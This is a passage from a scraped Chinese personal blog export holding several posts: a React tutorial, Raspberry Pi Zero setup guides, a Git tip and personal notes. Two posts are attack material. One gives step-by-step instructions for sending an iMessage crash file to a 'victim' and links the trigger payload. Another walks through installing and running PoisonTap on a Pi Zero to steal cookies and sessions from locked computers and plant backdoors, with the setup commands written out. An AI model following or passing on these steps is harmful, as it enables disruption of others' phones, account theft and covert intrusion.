123456789101112131415import React from 'react';import &#123; Button &#125; from 'semantic-ui-react';class ButtonComponent extends React.Component &#123; render() &#123; return( &lt;span&gt; &lt;Button color='blue' &gt;分钟&lt;/Button&gt; &lt;Button color='violet'&gt;小时&lt;/Button&gt; &lt;/span&gt; ); &#125;&#125;export default ButtonComponent; 代码部分用ES6书写，你可能会问什么是ES6？其实还有ES7(ECMAScript 2016)呢~ 那么，你可能看到了很变态的写法，就是HTML和JS混写，没错，这就是EJS，但请注意，这不是HTML，写着写着很有可能会掉入JSX陷阱。 经过babel等工具的编译后，JSX在运行的时候会被编译为真实的JavaScript语言，之所以这样写，只是为了方便程序员更方便的写代码。 比如上面的代码“HTML部分”会被编译为： 12React.createElement('button', &#123;class: 'ui blue button'&#125;, '分钟');React.createElement('button', &#123;class: 'ui violet button'&#125;, '小时'); 当然，JSX也有很多坑，比如： Module build failed: SyntaxError: Adjacent JSX elements must be wrapped in an enclosing tag 作为新手，这个问题，我经常遇到，因为你在写每一个JSX模块的时候，你需要用类似于&lt;div&gt;&lt;/div&gt;作为开始与结尾，不规范的代码不会被编译成功。 ECMAScript(ES)ES无疑是这几年最火的前端语言，没错，他是JavaScript的改进版，我知道，其实还有很多其他类似的比如CoffeeScript，但是ES会被各大浏览器所兼容支持，但是你可能会问到兼容性问题，没事，我们有babel工具。 ECMAScript：一个由 ECMA International 进行标准化，TC39 委员会进行监督的语言。通常用于指代标准本身。 JavaScript：ECMAScript 标准的各种实现的最常用称呼。这个术语并不局限于某个特定版本的 ECMAScript 规范，并且可能被用于任何不同程度的任意版本的 ECMAScript 的实现。 ECMAScript 5 (ES5)：ECMAScript 的第五版修订，于 2009 年完成标准化。这个规范在所有现代浏览器中都相当完全的实现了。 ECMAScript 6 (ES6) / ECMAScript 2015 (ES2015)：ECMAScript 的第六版修订，于 2015 年完成标准化。这个标准被部分实现于大部分现代浏览器。可以查阅这张兼容性表来查看不同浏览器和工具的实现情况。 ECMAScript Proposals：被考虑加入未来版本 ECMAScript 标准的特性与语法提案，他们需要经历五个阶段：Strawman（稻草人），Proposal（提议），Draft（草案），Candidate（候选）以及 Finished （完成）。 ECMAScript 2016：第七版 ECMAScript 修订，增加了两个新特性。 以上，都是我们常说的ES，在网上看到的代码目前以ES5和ES6居多，写法各异，我建议用最新版的写法写代码。 说白了，就是Javascript并不是一个优秀的语言，但是经过不断的填补，修正，已经让Javascript支持了很多新特性，新的语法，更多的书写方式，以及拥有了更严谨的编程思想。比如let,arrow function(就是这个：(i) =&gt; i + 1 )在ES中的运用等。 所以，在认识React之前，最好学习ES的新特性以及常用的新特性。 组件化我觉得这是React的重量级思想，组件化前端，从此，前端再也不是东拼西凑，而是像积木一样，拼起来。 React把单一的用户界面，拆成了各种各样的组件，形成“组件树”，采用分而治之的思想，有一个好处，就是维护起来极其方便，对于组件的修改也显得很容易。 数据绑定众所周知，Angular是双向数据绑定的，并且引以为豪，因为更容易维护与理解。 但是双向数据绑定也带来了许多问题，会在些其他功能的时候莫名其妙出现很多bug。 React是单向数据绑定的，是非常稳定的做法，但是也存在一些问题，就是在操作其他组件的时候，对于数据流的处理，显得异常困难。 在React中，数据绑定仅仅需要在render中写{数据绑定}，而非像Angular一样，两边都要设置，一定情况下讲，这是比较方便的。 数据模型state话说回来，React的每一个组件的实质是什么？状态机（State Machines），在React的每一个组件里，通过更新this.state，再通过render()进行渲染，React会自动把最新的状态渲染到网页上。 举个栗子🌰1234567891011121314151617class DateSelectorComponent extends Component &#123; constructor(props) &#123; super(props); let todaydate = this.showLocale(new Date()); this.state = &#123; timenow: todaydate, showCalendar: false &#125; return( &lt;div&gt; &lt;Input icon='calendar' iconPosition='left' readOnly onClick=&#123;this.showCalendar&#125; value=&#123;this.state.timenow&#125; ref=\"inputbox\"/&gt; &lt;ButtonComponent /&gt; &#123;CalendarComponent&#125; &lt;/div&gt; )&#125; 通过这样的方式，我就设置了state的默认初始值，默认日历选择器是不出现的，而今天的日期是今天日期，这很正常。然后在将所谓的值渲染到Dom上。 propsReact的数据流是单向的，是自上向下的层级传递的，props可以对固定的数据进行传递。 12345678910111213class HelloMessage extends Component &#123; render( return &lt;h1&gt;Hello &#123;this.props.name&#125;&lt;/h1&gt;; )&#125;class MainPage extends Component &#123;render()&#123; return( &lt;HelloMessage name=\"John\" /&gt; ) &#125;&#125; 在这种情况下，子组件会自动读取出父组件传递过来的props值John，并快速的渲染在页面上。 到底谁是谁state和props看起来很相似，其实是完全不同的东西。 问题 props state 可以从父组件得到初始值吗？ 可以 可以 可以被父组件改变值吗？ 可以 不可以 可以设置组件内部的初始值吗？ 可以 可以 可以改变组件内部的初始值吗？ 不可以 可以 可以设置子组件的初始值吗？ 可以 可以 可以改变子组件的初始值吗？ 可以 不可以 按照我的个人理解，props是静态的，存入不变量，比如 购物车里的 商品名称、价格；state是动态的，存入随时变化的量，比如 用户购买商品的总价，购买数目。 从操作的角度上讲，props是单向传递的，会一直被传递到子组件，而state更倾向于自身，只能改变自身的值。 获取Domthis.refs是react的重要组成之一，通过该方法可以快速高效的获取Dom。 例如，在JSX代码中这样写道1&lt;input ref=\"myInput\" /&gt; 便可以通过1this.refs.myInput.value 命令获取该Input下的dom属性的value值，非常方便。 生命周期组件都是有生命周期的，生命周期内，props和state改变会导致React自动用Diff算法重新渲染页面。那么生命周期到底都有哪些呢？ 大体上分为三类： 挂载： 组件被插入到DOM中。 更新： 组件被重新渲染，查明DOM是否应该刷新。 移除： 组件从DOM中移除。 从流程上讲，是这样的： 挂载期： getInitialState() –&gt;&gt; componentWillMount() –&gt;&gt; render() –&gt;&gt; componentDidMount() 更新期： componentWillReceiveProps() –&gt;&gt; shouldComponentUpdate() –&gt;&gt; componentWillUpdate render() –&gt;&gt; componentDidUpdate() 移除期： componentWillUnmount() 挂载componentWillMount()： 在初次渲染之前执行一次，最早的执行点 componentDidMount()： 在初次渲染之后执行，比较常用，比如持续执行某事件： 123componentDidMount()&#123; setInterval(this.loadData(this.state.date),1000);&#125; 更新componentWillReceiveProps()： 在组件接收到新的 props 的时候调用。在初始化渲染的时候，该方法不会调用。 shouldComponentUpdate()： 在接收到新的 props 或者 state，将要渲染之前调用。 componentWillUpdate()： 在接收到新的 props 或者 state 之前立刻调用。 componentDidUpdate()： 在组件的更新已经同步到 DOM 中之后立刻被调用。 移除componentWillUnmount()： 在组件从 DOM 中移除的时候立刻被调用。 FluxReact是MVC中V的一部分，而Flux则是M和C的部分，Flux是单向数据流，符合React的核心思想，不过，Flux并不完善，是一个很松散的架构。 Dispatcher： 处理动作分发，维护 Store 之间的依赖关系 Store： 数据和逻辑部分 View： React 组件，这一层可以看作 controller-views，作为视图同时响应用户交互 Action： 提供给 Dispatcher 传递数据给 Store Redux Flux把总架构都搭好了，可是实现起来并不容易，因为Flux并没有强大的API，只是一种纯粹的思想实现，而Redux是Flux的“升级版”，把各个部分更加方便的实现起来。 此部分未完待续 总结我觉得React给前端开发带来了一种全新的思想，那就是以JS为中心，一种全新的世界。 网页不再是网页，而是像工程一样，一块块搭建起来的，拆下来，搬上去都很容易，似的前端再也不是那个凌乱拼凑的年代。 我想任何一种编程语言，无论是解释性、脚本、编译语言都逃离不了这个全新的年代，就是组件化，大家似乎都在不同方向发展，但实际上，确实一样的。 相关阅读深入浅出React（四）：虚拟DOM Diff算法解析 React/React Native 的ES5 ES6写法对照表 React组件声明周期过程说明","categories":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"}],"keywords":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}]},{"title":"用Raspberry Pi Zero打造“即插即用”的Web服务器","slug":"network-zero-web","date":"2017-01-11T18:04:44.000Z","updated":"2017-10-26T12:59:55.527Z","comments":true,"path":"2017/01/12/network-zero-web/","link":"","permalink":"http://www.yfgeek.com/2017/01/12/network-zero-web/","excerpt":"","text":"虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？ 何为即插即用？ 类似于优盘一样，插上电脑，等待几秒，直接识别为网卡，直接输入树莓派的网址，连接就是自己的网站。 有什么用？ 实现本地web本地化，随着前端、后端技术的发展，web应用越来越多，但是web应用受制于网络的限制，一旦没有网络，就没有用武之地。 那么为什么不把web本地化呢？以后拿着“即插即用”的服务器，到任何电脑上，都能随时办公。 安装我们可以把树莓派虚拟为网卡，然后在内网连接它。 1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下： 1234diskutil listdiskutil unmountDisk /dev/SD卡的标号 #如disk2cd /Users/ivan/Downloads/2016-11-25-raspbian-jessie #进入目录sudo dd bs=1m if=2016-11-25-raspbian-jessie.img of=/dev/rdisk2 2.刷好系统后编辑config.txt文件，在最后一行下，另起一行添加：1dtoverlay=dwc2 保存文件 3.最后，打开cmdline.txt文件。找到单词rootwait，在其之后添加： 1modules-load=dwc2,g_ether 4.添加一个文件名为ssh到根目录下，内容为空 5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。 6.Ping 一下raspberrypi.local看是否能通 12345PING raspberrypi.local (169.254.70.245): 56 data bytes64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms 配置1.ssh连接raspberrypi.local，默认密码为raspberry1pi@raspberrypi.local 2.通过直接运行raspi-config命令 你需要做 容量扩展 更改系统时区 更改系统密码 3.同时你需要通过执行sudo passwd root更改root密码 4.在本机设置代理 首先，设置本机名为Mac，在本机搭建一个squid，为了使树莓派安装web server，以后日常使用不需要。 12brew updatebrew install squid 5.然后下载SquidMan，安装。在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。 6.进入树莓派的shell，输入：12cd /etc/apt/apt.conf.dsudo vi 50raspi 最后一行加入一句话：1Acquire::http::Proxy &quot;http://Mac.local:8080&quot;; 保存 7.继续输入apt-get update查看是否有网络。 8.安装lighthttpd+mysql+php 输入： 1sudo apt-get install lighttpd mysql-server php5-cgi php5-mysql 等待安装完毕后，修改php.ini设置 1sudo nano /etc/php5/cgi/php.ini 去掉这一条注释的;1;cgi.fix_pathinfo = 1 随后修改lighttpd.conf1sudo nano /etc/lighttpd/lighttpd.conf 在server.modules中增加fastcgi12345678server.modules = (&quot;mod_access&quot;,&quot;mod_alias&quot;,&quot;mod_compress&quot;,# &quot;mod_redirect&quot;,&quot;mod_fastcgi&quot;,# &quot;mod_rewrite&quot;,) 最后添加1234fastcgi.server = ( &quot;.php&quot; =&gt; (( &quot;bin-path&quot; =&gt; &quot;/usr/bin/php5-cgi&quot;, &quot;socket&quot; =&gt; &quot;/tmp/php.socket&quot;))) 重启lighttpd服务1sudo /etc/init.d/lighttpd restart 通过scp协议，上传一个index.php文件123&lt;?phpphpinfo();?&gt; 删除默认的index.htm文件，打开网站http://自己树莓派名字.local查看是否成功。 不错，接下来的事情，就是把自己的源代码传到树莓派上，不过多叙述。 多说一句从此以后，你只需要带上你的树莓派Zero就可以随时随地的打开自己的私有web服务。但是，树莓派Zero的性能，确实不行，建议跑一跑小型的程序，不要跑太大的程序。 至于应用嘛，其实做什么都可以的。","categories":[{"name":"Rasberry","slug":"Rasberry","permalink":"http://www.yfgeek.com/categories/Rasberry/"}],"tags":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/tags/Raspberry/"}],"keywords":[{"name":"Rasberry","slug":"Rasberry","permalink":"http://www.yfgeek.com/categories/Rasberry/"}]},{"title":"Git 文件、文件夹区分大小写","slug":"gitcase","date":"2017-01-06T18:25:32.000Z","updated":"2017-10-26T12:59:55.517Z","comments":true,"path":"2017/01/07/gitcase/","link":"","permalink":"http://www.yfgeek.com/2017/01/07/gitcase/","excerpt":"","text":"其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。 这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。 开启Git区分大小写 1git config core.ignorecase false 最近爱上了给别人找bug，Pull Request，❤️Github。 任何细节，都很重要。","categories":[{"name":"Github","slug":"Github","permalink":"http://www.yfgeek.com/categories/Github/"}],"tags":[{"name":"Github","slug":"Github","permalink":"http://www.yfgeek.com/tags/Github/"}],"keywords":[{"name":"Github","slug":"Github","permalink":"http://www.yfgeek.com/categories/Github/"}]},{"title":"iOS 10 iMessage字符崩溃Bug又来了","slug":"iOS-10-iMessage字符崩溃Bug又来了","date":"2017-01-01T19:49:54.000Z","updated":"2017-10-26T12:59:55.522Z","comments":true,"path":"2017/01/02/iOS-10-iMessage字符崩溃Bug又来了/","link":"","permalink":"http://www.yfgeek.com/2017/01/02/iOS-10-iMessage字符崩溃Bug又来了/","excerpt":"","text":"这是一篇本人发表到Freebuf的文章。 介绍近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2通用的iMessage字符崩溃Bug，该Bug同样利用了和当年iOS 8的iMessage短信Bug的类似手法，将一段恶意代码发送给受害者，受害者在接收短信后，浏览短信即可中招，此后短信应用陷入死机状态，除非打开修复网页程序，否则再也无法打开短信应用。 利用1. 下载利用文件 点击这里下载 2. 把它传到 iCloud Drive, 百度云, 或者任何你能够在iPhone上下载到的地方 3. 打开这个文件，点击分享，再点击 短信图标 4. 通过iMessage把这个文件传给你的受害者好友 5. 等待受害者点开短信，他会中招的 6. 可以通过这个链接来修复 点我修复 demo视频 工作原理在受害者打开短信的时候，触发了大量能够引起短信程序崩溃的字符，当用户浏览该短信的时候，cpu进行了大量的计算直到短信app点不动。当用户关掉短信程序后，再次打开短信程序，系统试图加载上一次内容，依然会触发该bug。 TXT版本的触发代码: http://vincedes3.com/crashtext.txt HTML版本的触发代码: http://vincedes3.com/crashtext.html 修复1. 把这个链接发给受害者手机 点我修复 2. 该链接会触发短信的快捷链接，点击打开 3. 进入发送短信页面 4. 点击取消 5. 删掉发送者的短信即可解决bug，请勿再次尝试点入 本文翻译自：https://vincedes3.com/crash-message-app-iphone/","categories":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}]},{"title":"2016，2017","slug":"2017","date":"2016-12-31T06:51:23.000Z","updated":"2017-10-26T12:59:55.514Z","comments":true,"path":"2016/12/31/2017/","link":"","permalink":"http://www.yfgeek.com/2016/12/31/2017/","excerpt":"","text":"似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。 每年这个时候，都会自觉地打开cnbeta.com看每一年的新年祝福。今年，也不例外，这么一看，已经9年过去了。 2016在2016年，这一年励志在Github上取得更大的成就，知乎上娱乐为主。 截止2016年12月31日，知乎累计收获了1388个赞，获得 252 次感谢，209 次收藏。 Github获得Star总数88个，607次代码贡献次数，702个粉丝。 同时，2016年是忙碌的一年，是纠结的一年，是辛苦的一年。在这一年里，顺利的通过了雅思考试，在这一年里顺利的本科毕业，在这一年里励志转行计算机。 在这一年里，好朋友各奔东西，都有了自己的发展方向与人生目标，而我却还在迷茫之中。 20172017年是关键的一年，决定着人生发展方向，人生充满机遇，未来的事情，谁说的好呢？ 我不去想， 是否能够成功 ， 既然选择了远方 ， 便只顾风雨兼程。","categories":[{"name":"心情","slug":"心情","permalink":"http://www.yfgeek.com/categories/心情/"}],"tags":[{"name":"心情","slug":"心情","permalink":"http://www.yfgeek.com/tags/心情/"}],"keywords":[{"name":"心情","slug":"心情","permalink":"http://www.yfgeek.com/categories/心情/"}]},{"title":"Emoji 表情域名 引领未来","slug":"emoji","date":"2016-12-26T19:37:27.000Z","updated":"2017-10-26T12:59:55.517Z","comments":true,"path":"2016/12/27/emoji/","link":"","permalink":"http://www.yfgeek.com/2016/12/27/emoji/","excerpt":"","text":"国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂 Emoji 等 Unicode 字符，浏览器Punycode的方式将 Unicode字符用ASCII进行编码。 我也顺势跟风，注册了一个坑爹的TK域名。 💌.tk 查询在chrome浏览器上直接输入[想要注册的表情].com 按下回车键，chrome浏览器会自动帮你转换为ASCII编码方式的格式。 💌.tk 转换为： http://xn--rr8h.tk/ 注册拿着自己的域名转换后的字符，比如xn–rr8h，去Godaddy或者别的域名网站直接搜就好啦。 注意： .com域名目前无法注册任何包含emoji表情字符的域名，尚未开发，一旦开放，又是一笔巨大的商机。 参考资料🐔.ws","categories":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"}],"keywords":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}]},{"title":"Raspberry Pi Zero联网奇妙记","slug":"network-zero","date":"2016-12-21T15:01:26.000Z","updated":"2017-10-26T12:59:55.520Z","comments":true,"path":"2016/12/21/network-zero/","link":"","permalink":"http://www.yfgeek.com/2016/12/21/network-zero/","excerpt":"","text":"说句实话，Zero真的不适合把玩，想让他连上网，太难了。 痛点 住公寓，有WiFi/Lan登录认证系统 公寓的网络动态分配范围很大，很难快速找到树莓派的IP 公寓的网络防止扫描端口，有惩罚策略 没有显示器 无法查看树莓派Zero的状态 树莓派Zero只有一个OTG USB接口 树莓派Zero没有内置以太网Lan 树莓派Zero没有无线网卡WiFi 树莓派Zero没有蓝牙 更没有蓝牙局域网 树莓派Zero除了核心部分 一无所有 已有装备 树莓派Zero USB HUB 分线器 USB 以太网网卡 USB WIFI (芯片 8188EU) 路由器 网线一根 MacBook Pro一台 已有环境 Raspbian系统 vncserver 解决方案整体思路 其中 USB HUB USB网卡 临时路由器 PC 是临时之用 配置一旦完成 抛弃这些设备直接插上WiFi自动联网。 去掉之前的USB网卡模式把sd卡取出，插入电脑 在config.txt下删除1dtoverlay=dwc2 在cmdline.txt下删除1modules-load=dwc2,g_ether 安装WiFi驱动之前遇到过很多坑，比如别的内核的WiFi驱动。 首先手动下载 https://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz 检查无线适配器版本，同时传到树莓派上 12345678910111213pi@zero:~ $ sudo ./install-wifiYour current kernel revision = 4.4.34+Your current kernel build = #930Checking for a wifi module to determine the driver to install.Your wifi module is Bus 001 Device 003: ID 0bda:8179 Realtek Semiconductor Corp.And it uses the 8188eu driver.Checking for a new 8188eu wifi driver module for your current kernel.The script cannot access Dropbox to check a driver is available. 手动下载https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz 切换WiFi到树莓派网络1scp 8188eu-4.4.34-930.tar.gz pi@zero.local:~ 在树莓派下123tar xzf 8188eu-4.4.34-930.tar.gzsudo ./install.shreboot 然后检查一下 lsusb(这个其实不靠谱) 然后再检查一下 ifconfig 1234567wlan0 Link encap:Ethernet HWaddr 0c:82:68:12:93:8f inet6 addr: fe80::4336:2657:c812:f11b/64 Scope:Link UP BROADCAST MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:6 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) 果然正确安装了。 配置WiFi但是wlan0 Link encap:Ethernet被识别为了以太网，接下来我们继续解决坑。1sudo iwlist wlan0 scan 123456789Cell 03 - Address: F0:B0:52:3B:7B:68 ESSID:\"ASK4 Wireless\" Protocol:IEEE 802.11gn Mode:Master Frequency:2.417 GHz (Channel 2) Encryption key:off Bit Rates:144 Mb/s Quality=18/100 Signal level=70/100 Extra:fm=0001 随后对wpa_supplicant.conf文件进行编辑，使之加入到自己的网络里。 请注意，key_mgmt=NONE表示没有WiFi密码(这是个查了很久猜得到的宝贵线索)，如果有密码请把这个更改为psk = &quot;密码&quot; 1sudo vi /etc/wpa_supplicant/wpa_supplicant.conf 12345678country=GBctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=1network=&#123; ssid=\"ASK4 Wireless\" key_mgmt=NONE&#125; 编辑/etc/network/interfaces文件，使wlan0为动态分配获取IP。 1sudo vi /etc/network/interfaces 1234567891011121314auto loiface lo inet loopbackiface eth0 inet dhcpauto wlan0allow-hotplug wlan0iface wlan0 inet dhcpwpa-conf /etc/wpa_supplicant/wpa_supplicant.confallow-hotplug wlan1iface wlan1 inet manual wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf 随后重启我们wlan0 12sudo ifdown wlan0sudo ifup wlan0 如果能搜索到WiFi会自动进行DHCP获取ip地址阶段 123456789Listening on LPF/wlan0/0c:82:68:12:93:8fSending on LPF/wlan0/0c:82:68:12:93:8fSending on Socket/fallbackDHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 8DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 12DHCPREQUEST on wlan0 to 255.255.255.255 port 67DHCPOFFER from 10.80.192.1DHCPACK from 10.80.192.1bound to 10.80.200.83 -- renewal in 440 seconds. 随后，用ifconfig命令查看一下获取的IP地址 1234567wlan0 Link encap:Ethernet HWaddr 0c:82:68:12:93:8f inet addr:10.80.200.83 Bcast:10.80.207.255 Mask:255.255.240.0 UP BROADCAST MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:17 overruns:0 frame:0 TX packets:0 errors:0 dropped:1 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:4681 (4.5 KiB) TX bytes:18372 (17.9 KiB) 再对mac地址进行绑定，再进入vnc，试试看 哇 可以上网了！ 然而悲痛的消息还有呢~ 内网隔离 ngrok TCP转发这难不倒我，用ngrok就可以解决，正好身在墙外，更加方便。 下载ngrok12wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zipunzip ngrok-stable-linux-arm.zip 配置开机启动项vi /etc/rc.local在exit 0 前面加入12/home/pi/ngrok authtoken 你的AUTO/home/pi/ngrok tcp 22 搞定！拔掉USB HUB，关掉路由器，重启！ 过了10分钟后，我们的树莓派上线了！ 用ssh命令连接一下 1ssh pi@0.tcp.ngrok.io -p 13016 连接速度超级快，如同本地一样，给ngrok官网点赞。 lighttpd 部署总要搞点事情嘛，部署一个Web服务对于512MB的内存的树莓派Zero不过分吧。 那么什么Web服务最合适呢？脑海第一时间想到轻量级的lighttpd，ngnix我都嫌弃费资源，那么就它了。 1sudo apt-get install -y lighttpd 安装完成！目录在/var/www/html 写好html，部署上去。 那么如何才能办到同时映射到两个端口呢？ngrok的官方文档有提示。 nano /home/pi/.ngrok2/ngrok.yml1234567891011121314authtoken: 你的AUTHregion: eujson_resolver_url: &quot;&quot;dns_resolver_ips: []tunnels: app-foo: addr: 80 proto: http host_header: app-foo.dev app-bar: addr: 22 proto: tcp host_header: app-bar.dev 这样就部署了两个服务，app-foo，app-bar，不错，开机再启动他们。 1sudo nano /etc/rc.local 把之前那句换成1/home/pi/proj/ngrok/ngrok start --config /home/pi/.ngrok2/ngrok.yml app-foo app-bar 好了，剩下我们要做的就是重启与等待。 哈哈，上线了，访问一下。 这个只有4英镑的树莓派实现联网后花费了： 树莓派：4磅 OTG线：0.86磅 WIFI适配器：人民币25元 储存卡：9磅 谢谢观看忍耐全文。","categories":[{"name":"Rasberry","slug":"Rasberry","permalink":"http://www.yfgeek.com/categories/Rasberry/"}],"tags":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/tags/Raspberry/"}],"keywords":[{"name":"Rasberry","slug":"Rasberry","permalink":"http://www.yfgeek.com/categories/Rasberry/"}]},{"title":"Wat 吐槽JavaScript","slug":"wat","date":"2016-12-20T17:17:26.000Z","updated":"2017-10-26T12:59:55.522Z","comments":true,"path":"2016/12/21/wat/","link":"","permalink":"http://www.yfgeek.com/2016/12/21/wat/","excerpt":"","text":"今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。 Wat 1234567891011121314[] + []\"\"[] + &#123;&#125;\"[object Object]\"&#123;&#125; + []0&#123;&#125; + &#123;&#125;\"[object Object][object Object]\"Array(16)[undefined × 16]Array(16).join(\"wat\")\"watwatwatwatwatwatwatwatwatwatwatwatwatwatwat\"Array(16).join(\"wat\" - 1 ) + \" Batman!\"\"NaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaN Batman!\" 总之，看完这个视频，我就想说一句： Javascript的出生与死亡此外还有另一个视频 对JS从1995-2035年的历史阐述及大胆预测。 十分客观的罗列出了JS的缺点、当前JS发展趋势必然产生的低效率问题。","categories":[{"name":"笑话","slug":"笑话","permalink":"http://www.yfgeek.com/categories/笑话/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"},{"name":"笑话","slug":"笑话","permalink":"http://www.yfgeek.com/tags/笑话/"}],"keywords":[{"name":"笑话","slug":"笑话","permalink":"http://www.yfgeek.com/categories/笑话/"}]},{"title":"30秒内盗取任意PC的Cookie神器 PoisonTap","slug":"poisontap","date":"2016-12-18T10:44:51.000Z","updated":"2017-10-26T12:59:55.515Z","comments":true,"path":"2016/12/18/poisontap/","link":"","permalink":"http://www.yfgeek.com/2016/12/18/poisontap/","excerpt":"著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。 是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。","text":"著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。 是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。 介绍PoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。 把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的： 有线网络&gt;无线网络 也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。 没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以： 模拟成一个伪USB网卡 不需要解锁电脑就可以实现攻击 劫持系统所有网络连接的所有流量 包括局域网 窃取储存Alexa前一百万的网站的Cookie和Session 用远程outbound的方式进行WebSocket或DNS重绑定攻击 用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商 截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标 PoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点： 锁屏密码 路由表ARP的优先级设置和网络适配器优先级设置 同源策略 (Same-Origin Policy) X-Frame-Options 响应头攻击 Cookie的HttpOnly安全设置 Cookie的SameSite安全属性 两步/多步验证密码(2FA/MFA) DNS劫持 跨域资源共享CORS HTTPS cookie 保护 安装接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。 注意！配置前请保证apt-get命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。 首先，我们在本机下载下来这个神器Poisontap 1git clone https://github.com/samyk/poisontap 然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。1scp -r poisontap pi@zero.local:~ 登录到树莓派上，运行12345678910cd poisontapecho -e \"\\nauto usb0\\nallow-hotplug usb0\\niface usb0 inet static\\n\\taddress 1.0.0.1\\n\\tnetmask 0.0.0.0\" &gt;&gt; /etc/network/interfacesecho \"dtoverlay=dwc2\" &gt;&gt; /boot/config.txtecho -e \"dwc2\\ng_ether\" &gt;&gt; /etc/modulessudo sed --in-place \"/exit 0/d\" /etc/rc.localecho \"/bin/sh /home/pi/poisontap/pi_startup.sh\" &gt;&gt; /etc/rc.localmkdir /home/pi/poisontapchown -R pi /home/pi/poisontapapt-get update &amp;&amp; apt-get upgradeapt-get -y install isc-dhcp-server dsniff screen nodejs 确保以上都成功后，运行12sudo cp dhcpd.conf /etc/dhcp/dhcpd.confreboot 好了，已经安装好了，接下来我们可以Hack啦~ HackCookie 和 Session窃取把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。 为了使攻击过程可视化，我们访问 www.google.com 动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。 打开Chrome的工具看一看，哇。 随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。 1cat poisontap.cookies.log 伪造网站远程后门参考https://github.com/samyk/poisontap","categories":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}]},{"title":"Raspberry 